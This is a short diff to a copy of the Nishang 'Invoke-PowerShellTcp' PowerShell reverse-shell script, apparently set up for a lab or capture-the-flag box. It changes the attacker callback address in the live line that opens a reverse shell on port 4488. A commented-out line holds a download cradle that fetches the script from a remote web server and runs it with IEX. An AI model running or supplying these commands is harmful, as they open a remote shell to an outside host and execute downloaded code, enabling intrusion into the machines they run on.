@@ -126,6 +126,6 @@ https://github.com/samratashok/nishang
 }
 
 
-Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.112 -Port 4488
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.107 -Port 4488
 
 #powershell -C IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.24/Invoke-PowerShellTcp.ps1')
